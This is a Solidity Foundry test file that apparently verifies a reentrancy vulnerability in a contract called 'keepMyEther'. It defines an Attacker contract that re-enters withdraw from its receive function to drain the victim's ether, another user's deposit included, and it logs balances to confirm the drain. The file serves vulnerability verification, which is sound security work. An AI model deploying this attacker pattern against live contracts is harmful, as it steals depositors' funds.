// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol";

contract ReentrancyTest is Test {
    keepMyEther public victimContract;
    Attacker public attackerContract;
    address public user2;

    function setUp() public {
        victimContract = new keepMyEther();
        attackerContract = new Attacker(victimContract);
        
        // Fund attacker contract for deposit
        vm.deal(address(attackerContract), 1 ether);
        
        // Create and fund separate user to deposit
        user2 = address(0x123);
        vm.deal(user2, 1 ether);
        
        // Have user2 deposit 1 ETH
        vm.prank(user2);
        (bool success,) = address(victimContract).call{value: 1 ether}("");
        require(success, "user2 deposit failed");
    }

    function testEthReentrancy() public {
        // === BEFORE STATE CAPTURE ===
        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 totalWithdrawalsBefore = victimContract.totalWithdrawals();
        (uint256 attackerVictimBalanceBefore, uint256 attackerDepositCountBefore) = 
            victimContract.getUserStats(address(attackerContract));
        
        console2.log("Total Withdrawals Before:", totalWithdrawalsBefore);
        console2.log("Attacker Balance in Victim Before:", attackerVictimBalanceBefore);
        console2.log("Attacker Deposit Count Before:", attackerDepositCountBefore);

        uint256 victimBalanceBefore = address(victimContract).balance;
        uint256 attackerBalanceBefore = address(attackerContract).balance;
        console2.log("Victim ETH Balance Before:", victimBalanceBefore);
        console2.log("Attacker ETH Balance Before:", attackerBalanceBefore);

        // === TRIGGER ATTACK ===
        console2.log("--- Trigger Attack ---");
        attackerContract.attack();

        // === AFTER STATE CAPTURE ===
        console2.log("--- AFTER-Trigger Attack ---");
        uint256 totalWithdrawalsAfter = victimContract.totalWithdrawals();
        (uint256 attackerVictimBalanceAfter, uint256 attackerDepositCountAfter) = 
            victimContract.getUserStats(address(attackerContract));
        
        console2.log("Total Withdrawals After:", totalWithdrawalsAfter);
        console2.log("Attacker Balance in Victim After:", attackerVictimBalanceAfter);
        console2.log("Attacker Deposit Count After:", attackerDepositCountAfter);

        uint256 victimBalanceAfter = address(victimContract).balance;
        uint256 attackerBalanceAfter = address(attackerContract).balance;
        console2.log("Victim ETH Balance After:", victimBalanceAfter);
        console2.log("Attacker ETH Balance After:", attackerBalanceAfter);

        // === DIFFERENTIAL VALIDATION ===
        bool vulnerabilityExists = true;
        string memory reason = "";

        // Check total withdrawals increased by 2 ETH
        if (totalWithdrawalsAfter != totalWithdrawalsBefore + 2 ether) {
            vulnerabilityExists = false;
            reason = "Total withdrawals didn't increase by 2 ETH";
        }
        
        // Check attacker balance in victim reset to 0
        if (attackerVictimBalanceAfter != 0) {
            vulnerabilityExists = false;
            reason = string(abi.encodePacked(reason, vulnerabilityExists ? "" : " | ", "Attacker victim balance not reset"));
        }
        
        // Check reentrant calls depth
        if (attackerContract.reentrantCalls() != 2) {
            vulnerabilityExists = false;
            reason = string(abi.encodePacked(reason, vulnerabilityExists ? "" : " | ", "Reentrancy depth mismatch"));
        }
        
        // Check victim ETH drained
        if (victimBalanceAfter != 0) {
            vulnerabilityExists = false;
            reason = string(abi.encodePacked(reason, vulnerabilityExists ? "" : " | ", "Victim ETH not drained"));
        }

        // === FINAL VERDICT ===
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Reentrancy attack successfully manipulated contract state");
        } else {
            console2.log("Vulnerability not Exist:", reason);
        }
    }
}

contract Attacker {
    keepMyEther public target;
    uint256 public reentrantCalls;
    bool public isAttacking;

    constructor(keepMyEther _target) {
        target = _target;
    }

    function attack() public {
        isAttacking = true;
        // Perform initial deposit
        (bool depositSuccess,) = address(target).call{value: 1 ether}("");
        require(depositSuccess, "Initial deposit failed");
        
        // Start attack
        target.withdraw();
        isAttacking = false;
    }

    receive() external payable {
        if (isAttacking && reentrantCalls < 1) {
            reentrantCalls++;
            target.withdraw();
        } else {
            // Count final call but don't reenter
            reentrantCalls = 2;
        }
    }
}